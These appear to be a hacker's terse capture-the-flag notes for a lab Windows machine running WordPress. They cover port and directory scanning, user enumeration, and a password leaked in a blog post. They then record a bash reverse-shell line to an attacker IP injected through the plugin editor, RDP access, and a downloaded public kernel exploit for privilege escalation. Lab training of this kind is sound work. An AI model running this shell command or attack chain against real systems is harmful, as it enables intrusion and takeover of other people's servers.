```
root@kali:~# nmap -sV -sC -T5 -p- 10.10.47.48
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-23 02:27 UTC
Nmap scan report for ip-10-10-47-48.eu-west-1.compute.internal (10.10.47.48)
Host is up (0.00044s latency).
Not shown: 65532 filtered ports
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info:
|   Target_Name: RETROWEB
|   NetBIOS_Domain_Name: RETROWEB
|   NetBIOS_Computer_Name: RETROWEB
|   DNS_Domain_Name: RetroWeb
|   DNS_Computer_Name: RetroWeb
|   Product_Version: 10.0.14393
|_  System_Time: 2020-07-23T02:28:29+00:00
| ssl-cert: Subject: commonName=RetroWeb
| Not valid before: 2020-07-22T02:21:02
|_Not valid after:  2021-01-21T02:21:02
|_ssl-date: 2020-07-23T02:28:29+00:00; +1s from scanner time.
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
MAC Address: 02:93:20:EE:02:68 (Unknown)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 87.43 seconds
root@kali:~#
```


```
root@kali:~# gobuster dir -u 10.10.47.48 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php,txt,ht
ml,zip
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.47.48
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     html,zip,php,txt
[+] Timeout:        10s
===============================================================
2020/07/23 02:30:48 Starting gobuster
===============================================================
/retro (Status: 301)
/Retro (Status: 301)
===============================================================
2020/07/23 02:32:35 Finished
===============================================================
```

```
root@kali:~# gobuster dir -u http://10.10.47.48/retro -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
-x php,txt,html,zip
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.47.48/retro
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     txt,html,zip,php
[+] Timeout:        10s
===============================================================
2020/07/23 02:33:05 Starting gobuster
===============================================================
/wp-content (Status: 301)
/license.txt (Status: 200)
/wp-includes (Status: 301)
/README.html (Status: 200)
/readme.html (Status: 200)
/LICENSE.txt (Status: 200)
/License.txt (Status: 200)
/index.php (Status: 301)
/wp-login.php (Status: 200)
/Index.php (Status: 301)
/INDEX.php (Status: 301)
/wp-trackback.php (Status: 200)
/wp-admin (Status: 301)
/ReadMe.html (Status: 200)
/Readme.html (Status: 200)
/wp-signup.php (Status: 302)
===============================================================
2020/07/23 02:36:19 Finished
===============================================================
```


```
root@kali:~# wpscan --url http://10.10.47.48/retro/ --enumerate u
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ R
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.7.7

       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] Updating the Database ...
[i] Update completed.

[+] URL: http://10.10.47.48/retro/
[+] Started: Thu Jul 23 02:43:10 2020

Interesting Finding(s):

[+] http://10.10.47.48/retro/
 | Interesting Entries:
 |  - Server: Microsoft-IIS/10.0
 |  - X-Powered-By: PHP/7.1.29
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] http://10.10.47.48/retro/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access

[+] http://10.10.47.48/retro/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] http://10.10.47.48/retro/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.2.1 identified (Insecure, released on 2019-05-21).
 | Found By: Rss Generator (Passive Detection)
 |  - http://10.10.47.48/retro/index.php/feed/, <generator>https://wordpress.org/?v=5.2.1</generator>
 |  - http://10.10.47.48/retro/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.2.1</generator>

[+] WordPress theme in use: 90s-retro
 | Location: http://10.10.47.48/retro/wp-content/themes/90s-retro/
 | Latest Version: 1.4.10 (up to date)
 | Last Updated: 2019-04-15T00:00:00.000Z
 | Readme: http://10.10.47.48/retro/wp-content/themes/90s-retro/readme.txt
 | Style URL: http://10.10.47.48/retro/wp-content/themes/90s-retro/style.css?ver=5.2.1
 | Style Name: 90s Retro
 | Style URI: https://organicthemes.com/retro-theme/
 | Description: Have you ever wished your WordPress blog looked like an old Geocities site from the 90s!? Probably n...
 | Author: Organic Themes
 | Author URI: https://organicthemes.com
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.4.10 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://10.10.47.48/retro/wp-content/themes/90s-retro/style.css?ver=5.2.1, Match: 'Version: 1.4.10'

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:07 <=======================================> (10 / 10) 100.00% Time: 00:00:07

[i] User(s) Identified:

[+] wade
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://10.10.47.48/retro/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] Wade
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[!] No WPVulnDB API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up

[+] Finished: Thu Jul 23 02:43:33 2020
[+] Requests Done: 67
[+] Cached Requests: 6
[+] Data Sent: 13.622 KB
[+] Data Received: 15.266 MB
[+] Memory used: 124.934 MB
[+] Elapsed time: 00:00:23
root@kali:~#
```

- http://10.10.47.48/retro/index.php/2019/12/09/ready-player-one/

- pass
```
Leaving myself a note here just in case I forget how to spell it: XXXXXX
```


- exec("/bin/bash -c 'bash -i > /dev/tcp/10.10.176.195/1234 0>&1'");
- http://10.10.47.48/retro/wp-admin/plugin-editor.php



- https://qiita.com/fjtter/items/be213ff906b17809bf92

```
root@kali:~# rdesktop 10.10.192.111
Autoselecting keyboard map 'en-us' from locale

ATTENTION! The server uses and invalid security certificate which can not be trusted for
the following identified reasons(s);

 1. Certificate issuer is not trusted by this system.

     Issuer: CN=RetroWeb


Review the following certificate info before you trust it to be added as an exception.
If you do not trust the certificate the connection atempt will be aborted:

    Subject: CN=RetroWeb
     Issuer: CN=RetroWeb
 Valid From: Wed Jul 22 03:12:08 2020
         To: Thu Jan 21 03:12:08 2021

  Certificate fingerprints:

       sha1: 0b4d57647296208e84419a1cf99c5810185e5f73
     sha256: fe78bb5db2c378ce5d55ac406c6f69b80fe7b3a7b4915e7394a141c5daee47b4


Do you trust this certificate (yes/no)? yes
Failed to initialize NLA, do you have correct Kerberos TGT initialized ?
Failed to connect, CredSSP required by server (check if server has disabled old TLS versions, if yes use -V option).

```

```
root@kali:~# xfreerdp /v:10.10.192.111 /u:wade
[03:50:17:689] [2316:2317] [INFO][com.freerdp.client.common.cmdline] - loading channelEx cliprdr
[03:50:18:185] [2316:2317] [INFO][com.freerdp.crypto] - creating directory /root/.config/freerdp
[03:50:18:185] [2316:2317] [INFO][com.freerdp.crypto] - creating directory [/root/.config/freerdp/certs]
[03:50:18:185] [2316:2317] [INFO][com.freerdp.crypto] - created directory [/root/.config/freerdp/server]
[03:50:18:189] [2316:2317] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[03:50:18:189] [2316:2317] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[03:50:18:189] [2316:2317] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[03:50:18:189] [2316:2317] [ERROR][com.freerdp.crypto] - The hostname used for this connection (10.10.192.111:3389) 
[03:50:18:189] [2316:2317] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
[03:50:18:189] [2316:2317] [ERROR][com.freerdp.crypto] - Common Name (CN):
[03:50:18:189] [2316:2317] [ERROR][com.freerdp.crypto] - 	RetroWeb
[03:50:18:189] [2316:2317] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 10.10.192.111:3389 (RDP-Server):
	Common Name: RetroWeb
	Subject:     CN = RetroWeb
	Issuer:      CN = RetroWeb
	Thumbprint:  0b:4d:57:64:72:96:20:8e:84:41:9a:1c:f9:9c:58:10:18:5e:5f:73
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
Password: 

```

- user.txt
```
desktop
```

privilege
```
check browser
favorite:https://github.com/jas502n/CVE-2019-1388

check recycle bin


https://github.com/jas502n/CVE-2019-1388
```

```
root@kali:~# wget https://github.com/SecWiki/windows-kernel-exploits/raw/master/CVE-2017-0213/CVE-2017-0213_x64.zip
--2020-07-23 04:25:17--  https://github.com/SecWiki/windows-kernel-exploits/raw/master/CVE-2017-0213/CVE-2017-0213_x64.zip
Resolving github.com (github.com)... 140.82.118.4
Connecting to github.com (github.com)|140.82.118.4|:443... connected.
HTTP request sent, awaiting response... 302 Found
Location: https://raw.githubusercontent.com/SecWiki/windows-kernel-exploits/master/CVE-2017-0213/CVE-2017-0213_x64.zip [following]
--2020-07-23 04:25:17--  https://raw.githubusercontent.com/SecWiki/windows-kernel-exploits/master/CVE-2017-0213/CVE-2017-0213_x64.zip
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 199.232.24.133
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|199.232.24.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 83287 (81K) [application/zip]
Saving to: ‘CVE-2017-0213_x64.zip’

CVE-2017-0213_x64.z 100%[===================>]  81.33K  --.-KB/s    in 0.003s  

2020-07-23 04:25:18 (25.8 MB/s) - ‘CVE-2017-0213_x64.zip’ saved [83287/83287]

root@kali:~# ls
CVE-2017-0213_x64.zip  Downloads      Music	rever.php	   Videos
Desktop		       HHUPD.EXE      Pictures	Templates
Documents	       hydra.restore  Public	thinclient_drives
root@kali:~# unzip CVE-2017-0213_x64.zip 
Archive:  CVE-2017-0213_x64.zip
  inflating: CVE-2017-0213_x64.exe   
root@kali:~# ls
CVE-2017-0213_x64.exe  Documents  hydra.restore  Public     thinclient_drives
CVE-2017-0213_x64.zip  Downloads  Music		 rever.php  Videos
Desktop		       HHUPD.EXE  Pictures	 Templates
root@kali:~# 
```

```
12/09/2019  12:10 AM    <DIR>          Music
12/09/2019  12:10 AM    <DIR>          Pictures
12/09/2019  12:10 AM    <DIR>          Saved Games
12/09/2019  12:10 AM    <DIR>          Searches
12/09/2019  12:10 AM    <DIR>          Videos
               0 File(s)              0 bytes
              13 Dir(s)  30,399,991,808 bytes free

C:\Users\Administrator>cd Desktop

C:\Users\Administrator\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is 7443-948C

 Directory of C:\Users\Administrator\Desktop

12/08/2019  09:06 PM    <DIR>          .
12/08/2019  09:06 PM    <DIR>          ..
12/08/2019  09:08 PM                32 root.txt.txt
               1 File(s)             32 bytes
               2 Dir(s)  30,399,991,808 bytes free

C:\Users\Administrator\Desktop>type root.txt.txt
XXXXXXXXXXXXXXXXXXXXXX
C:\Users\Administrator\Desktop>
```
